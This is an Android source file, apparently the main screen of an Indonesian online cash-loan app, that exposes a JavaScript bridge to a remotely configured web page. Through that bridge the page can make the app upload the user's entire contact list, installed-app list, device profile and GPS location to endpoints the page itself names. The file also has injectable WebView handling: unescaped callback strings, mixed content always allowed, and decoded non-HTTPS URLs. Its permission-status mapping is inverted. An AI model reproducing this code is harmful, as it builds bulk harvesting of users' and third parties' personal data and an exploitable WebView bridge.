package com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.ui;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.KeyEvent;
import android.webkit.ValueCallback;
import android.webkit.WebSettings;
import android.webkit.WebView;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.abroad.crawllibrary.main.CrawlMainHandler;
import com.google.gson.Gson;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.Constants;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.HostSwitchHandle;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.MyApplication;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.R;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.base.BaseActivity;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.entity.InitResultBean;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.entity.LunDuBean;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.entity.ParameterUtil;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.firebase.AnalyticsWebInterface;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.interfice.HostSwitchInterfice;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.interfice.OkResultCallback;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.net.OKHttpUtil;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.util.ContactsUtil;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.util.GetSystemAppInfoList;
import com.rupiah.cash.line.pinjaman.selamat.online.cepat.duit.murah.rendah.util.GpsLocationUtils;
import com.tbruyelle.rxpermissions2.RxPermissions;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.URLDecoder;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

import goutil.Goutil;
import okhttp3.Call;
import okhttp3.Response;

import static android.Manifest.permission.ACCESS_FINE_LOCATION;
import static android.Manifest.permission.CAMERA;
import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;

public class MainActivity extends BaseActivity implements HostSwitchInterfice {
    private String TAG = MainActivity.class.getSimpleName();

    private WebView mWeb;
    private ParameterUtil mParameterUtil;
    private HostSwitchHandle mHostSwitchHandle;
    private Boolean disabled;
    private double[] location;
    private String mCallback = "";

    @Override
    public int getLayoutId() {
        return R.layout.activity_main;
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    @Override
    public void initView() {
        mWeb = findViewById(R.id.web);
        mHostSwitchHandle = new HostSwitchHandle(mWeb, this, this);
        mHostSwitchHandle.switchHandle();
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    @Override
    public void initData() {
        initH5();
        initWebView();
    }


    @SuppressLint("CheckResult")
    @RequiresApi(api = Build.VERSION_CODES.N)
    private void initH5() {
        mParameterUtil = new ParameterUtil(mContext, mSpUtil);
        //???????????????
        String requestData = Goutil.sendRequest(
                Constants.ENV_URL,
                getString(R.string.app_name),
                Constants.API_CODE,
                mParameterUtil.getInitJson(),
                "{}");
        Log.d(TAG, "initH5: " + requestData);
        InitResultBean initResultBean = new Gson().fromJson(requestData, InitResultBean.class);
        try {
            JSONObject jsonObject = new JSONObject(requestData);
            String config = new String(Goutil.decrypt(getCurrentPrams(), initResultBean.data.config));
            JSONObject configBean = new JSONObject(config);
            JSONObject appInfo = configBean.getJSONObject("appInfo");
            JSONArray extendList = configBean.getJSONArray("extendList");
            if (appInfo != null) {
                checkUrlForHttps(appInfo.getString("entrypoint"));
            }
            if (null != extendList && extendList.length() > 0) {
                for (int i = 0; i < extendList.length(); i++) {
                    JSONObject jsonObject1 = new JSONObject(extendList.get(i).toString());
                    switch (jsonObject1.get("extendCode").toString()) {
                        case "ld_api_secret_key":
                            mSpUtil.putString(Constants.LD_API_SECRET_KEY, jsonObject1.getString("extendValue"));
                            break;
                        case "ld_api_access_key":
                            mSpUtil.putString(Constants.LD_API_ACCESS_KEY, jsonObject1.getString("extendValue"));
                            break;
                    }
                }
            }
            mSpUtil.putString(Constants.DEVICE_ID, initResultBean.data.deviceId);
            mSpUtil.putString(Constants.DEVICE_TOKEN, initResultBean.data.deviceToken);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void initWebView() {
        WebSettings settings = mWeb.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setLoadWithOverviewMode(true);                                      //??????js??????
        settings.setUseWideViewPort(true);                                           //????????????????????????????????????
        settings.setDomStorageEnabled(true);                                         //??????????????????
        settings.setJavaScriptCanOpenWindowsAutomatically(true);                     //??????Dom storage api
        settings.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.NARROW_COLUMNS);     //??????????????????
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);                             //??????????????????
        settings.setDefaultTextEncodingName("utf-8");                                //??????????????????
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            mWeb.addJavascriptInterface(new AnalyticsWebInterface(this), AnalyticsWebInterface.TAG);
        }
    }

    private void checkUrlForHttps(String url) {
        if (url.startsWith("https://")) {
            mWeb.loadUrl(url);
        } else {
            mWeb.loadUrl(URLDecoder.decode(url));
        }
    }

    /**
     * host??????
     *
     * @param data
     * @param callback
     */
    @RequiresApi(api = Build.VERSION_CODES.N)
    @Override
    public void appInfo(String data, String callback) {
        uploadUrl(callback, mParameterUtil.getInitAppInfo());
    }

    @Override
    public void updateUid(String data, String callback) {
        try {
            JSONObject jsonObject = new JSONObject(data);
            mSpUtil.putString(Constants.UID, jsonObject.getString(Constants.UID));
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void getAL(String data, String callback) {
        GetSystemAppInfoList.getALInfo(MyApplication.context);
        uploadUrl(callback, data);
    }

    @SuppressLint("CheckResult")
    @Override
    public void uploadDeviceInfo(String data, String callback) {

        new RxPermissions(this)
                .request(lundu)
                .subscribe(granted -> {
                    if (granted) {
                        String mResult = CrawlMainHandler.getDeviceInfo();
                        uploadLunDu(data, mResult, callback);
                    } else {
                        try {
                            JSONObject jsonObject = new JSONObject();
                            jsonObject.put("isSuccess", false);
                            jsonObject.put("failReason", "apply");
                            uploadUrl(callback, jsonObject.toString());
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });
    }

    @SuppressLint("CheckResult")
    @Override
    public void getGPS(String data, String callback) {
        try {
            new RxPermissions(this).request(gps).subscribe(
                    granted -> {
                        if (granted) {
                            int waitTime = (int) new JSONObject(data).get("waitTime");
                            runOnUiThread(() -> {
                                location = GpsLocationUtils.getLocation(MyApplication.context);
                            });
                            if (waitTime == 10) {
                                new Timer().schedule(new TimerTask() {
                                    @Override
                                    public void run() {
                                        runOnUiThread(() -> {
                                            uploadGpsStatus(true, location, callback);
                                        });
                                    }
                                }, 10000);
                            } else {
                                uploadGpsStatus(false, location, callback);
                            }
                        } else {
                            uploadGpsStatus(false, location, callback);
                        }
                    }
            );
        } catch (Exception e) {
            e.printStackTrace();
        }


    }


    @Override
    public void huoti(String data, String callback) {
        //??????
//        Map<String, Object> isSuccess = new HashMap<>();
//        isSuccess.put("isSuccess", isAllGranted);
//        if (isAllGranted) {
//            startLivenessActivity();
//        } else {
//
//           mHostSwitchHandle.uploadData(mCallback, new Gson().toJson(isSuccess));
//        }

        startCheckActivity();
    }

    @Override
    public void jumpUrlOuter(String data, String callback) {
        try {
            String string = new JSONObject(data).getString("url");
            if (!string.startsWith("https://")) {
                string = URLDecoder.decode(string);
            }
            //???????????????????????????
            Intent intent = new Intent();
            intent.setAction(Intent.ACTION_VIEW);
            intent.setData(Uri.parse(string));
            startActivity(intent);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void jumpUrlInner(String data, String callback) {
        mHostSwitchHandle.loadUrl(data);
    }

    @Override
    public void disabledGoBack(String data, String callback) {
        try {
            disabled = (Boolean) new JSONObject(data).get("disabled");
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void closeNewWebview(String data, String callback) {
        mWeb.reload();
        finish();
    }

    @Override
    public void reload(String data, String callback) {
        mWeb.reload();
    }

    @SuppressLint("CheckResult")
    @Override
    public void applyPermission(String data, String callback) {
        String permissions = null;
        try {
            permissions = (String) new JSONObject(data).get("permissions");
            String[] mSplit = permissions.split(",");
            String[] strings = new String[mSplit.length];
            for (int i = 0; i < mSplit.length; i++) {
                switch (mSplit[i]) {
                    case "gps":
                        strings[i] = ACCESS_FINE_LOCATION;
                        break;
                    case "readPhoneState":
                        strings[i] = READ_PHONE_STATE;
                        break;
                    case "camera":
                        strings[i] = CAMERA;
                        break;
                    case "contacts":
                        strings[i] = READ_CONTACTS;
                        break;
                    case "write":
                        strings[i] = WRITE_EXTERNAL_STORAGE;
                        break;
                }
            }
            final int[] i = {0};
            new RxPermissions(this)
                    .requestEach(strings)
                    .subscribe(permission -> {
                        Map<String, String> gpsMap = new HashMap<>();
                        if (permission.granted) {
                            gpsMap.put(mSplit[i[0]], "refused");
                        } else if (permission.shouldShowRequestPermissionRationale) {
                            gpsMap.put(mSplit[i[0]], "forbid");
                        } else {
                            gpsMap.put(mSplit[i[0]], "granted");
                        }
                        i[0]++;
                        if (i[0] == mSplit.length) {
                            mHostSwitchHandle.uploadData(callback, new Gson().toJson(gpsMap));
                        }
                    });
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @SuppressLint("CheckResult")
    @Override
    public void applyCamera(String data, String callback) {
        JSONObject jsonObject = new JSONObject();
        new RxPermissions(this)
                .request(cameraPermission)
                .subscribe(granted -> {
                    jsonObject.put("isSuccess", granted);
                    uploadUrl(callback, jsonObject.toString());
                });
    }

    @Override
    public void exitApp(String data, String callback) {
        finish();
        System.exit(0);
    }

    @Override
    public void jumpSetting(String data, String callback) {
        //??????app????????????
        Intent mIntent = new Intent();
        mIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if (Build.VERSION.SDK_INT >= 9) {
            mIntent.setAction("android.settings.APPLICATION_DETAILS_SETTINGS");
            mIntent.setData(Uri.fromParts("package", MyApplication.context.getPackageName(), null));
        } else if (Build.VERSION.SDK_INT <= 8) {
            mIntent.setAction(Intent.ACTION_VIEW);
            mIntent.setClassName("com.android.settings", "com.android.setting.InstalledAppDetails");
            mIntent.putExtra("com.android.settings.ApplicationPkgName", MyApplication.context.getPackageName());
        }
        MyApplication.context.startActivity(mIntent);
    }

    @Override
    public void goHome(String data, String callback) {

    }

    @SuppressLint("CheckResult")
    @Override
    public void chooseLinkman(String data, String callback) {
        mCallback = callback;
        new RxPermissions(this)
                .request(readContacts)
                .subscribe(granted -> {
                    if (granted) {
                        Intent intent = new Intent();
                        intent.setAction("android.intent.action.PICK");
                        intent.addCategory("android.intent.category.DEFAULT");
                        intent.setType("vnd.android.cursor.dir/phone_v2");
                        startActivityForResult(intent, Constants.CONTACTS_INFO);
                    } else {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("isSuccess", false);
                        uploadUrl(callback, jsonObject.toString());
                    }
                });
    }

    @SuppressLint("CheckResult")
    @Override
    public void uploadAB(String data, String callback) {
        new RxPermissions(this)
                .request(readContacts)
                .subscribe(granted -> {
                    if (granted) {
                        JSONObject contactsObject = new JSONObject();
                        JSONArray contactsArrAy = ContactsUtil.getContactsAll(MyApplication.context);
                        contactsObject.put("contacts", contactsArrAy);
                        OKHttpUtil.uploadText(data, contactsObject.toString(), new OkResultCallback() {
                            @Override
                            public void onSuccess(Call call, Response response) {
                                uploadUrl(callback, ParameterUtil.getIsSuccessJson(true));
                            }

                            @Override
                            public void onFailed(Call call, IOException e) {
                                uploadUrl(callback, ParameterUtil.getIsSuccessJson(false));
                            }
                        }, this);
                    } else {
                        uploadUrl(callback, ParameterUtil.getIsSuccessJson(false));
                    }
                });
    }

    /**
     * ??????gps?????????????????????
     */
    private void uploadGpsStatus(boolean b, double[] location, String callback) {
        Map<String, Object> gpsPrams = new HashMap<>();
        gpsPrams.put("isSuccess", b);
        gpsPrams.put("gpsState", isGpsEnabled(mContext));
        if (null != location) {
            gpsPrams.put("longitude", location[1]);
            gpsPrams.put("latitude", location[0]);
        } else {
            gpsPrams.put("longitude", 0);
            gpsPrams.put("latitude", 0);
        }
        uploadUrl(callback, new Gson().toJson(gpsPrams));
    }

    /**
     * ????????????????????????
     *
     * @param context
     * @return
     */
    public static boolean isGpsEnabled(Context context) {
        LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        return lm.isProviderEnabled(LocationManager.GPS_PROVIDER);
    }

    /**
     * ??????????????????
     *
     * @param data
     * @param mResult
     * @throws JSONException
     */
    private void uploadLunDu(String data, String mResult, String callback) {
        HashMap<String, Object> lunduMap = new HashMap<>();
        LunDuBean lunDuInfoBean = new Gson().fromJson(mResult, LunDuBean.class);
        String lunDuInfoBeanJson = new Gson().toJson(lunDuInfoBean);
        OKHttpUtil.uploadText(data, lunDuInfoBeanJson, new OkResultCallback() {
            @Override
            public void onSuccess(Call call, Response response) {
                lunduMap.put("isSuccess", true);
                uploadUrl(callback, new Gson().toJson(lunduMap));
            }

            @Override
            public void onFailed(Call call, IOException e) {
                lunduMap.put("isSuccess", false);
                lunduMap.put("failReason", "apply");
                uploadUrl(callback, new Gson().toJson(lunduMap));
            }
        }, this);
    }

    public void uploadUrl(String callback, String data) {
        mWeb.evaluateJavascript("javascript: " + callback + "(" + data + ")", new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String value) {
                //????????? js ???????????????
                Log.d(TAG, "???????????????h5??????" + value);
            }
        });
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if ((keyCode == KeyEvent.KEYCODE_BACK)) {
            if (mWeb.canGoBack()) {
                //goBack()????????????WebView???????????????
                mWeb.goBack();
            } else {
                finish();
            }
            return true;
        }
        return false;
    }

    /**
     * ??????????????????
     */
    private void startCheckActivity() {
//        Intent intent = new Intent(this, LivenessActivity.class);
//        startActivityForResult(intent,Constants.REQUEST_CODE_LIVENESS);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == Constants.CONTACTS_INFO) {//???????????????????????????
            if (data == null) {
                return;
            }
            //???????????????data,??????????????????????????????
            Uri uri = data.getData();
            String phoneNum = null;
            String contactName = null;
            // ?????????????????????
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = null;
            if (uri != null) {
                cursor = contentResolver.query(uri, new String[]{"display_name", "data1"}, null, null, null);
            }
            while (cursor.moveToNext()) {
                contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                phoneNum = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            }
            cursor.close();
            //  ?????????????????????  -  ?????? ???????????????
            if (phoneNum != null) {
                phoneNum = phoneNum.replaceAll("-", " ");
                // ????????????  ??????????????????-?????????"" ????????????????????????????????????????????? ??????????????????
                phoneNum = phoneNum.replaceAll(" ", "");
            }
            Map<String, Object> stringObjectHashMap = new HashMap<>();
            stringObjectHashMap.put("isSuccess", true);
            stringObjectHashMap.put("name", contactName);
            stringObjectHashMap.put("mobile", phoneNum);
            uploadUrl(mCallback, new Gson().toJson(stringObjectHashMap));
        }
    }
}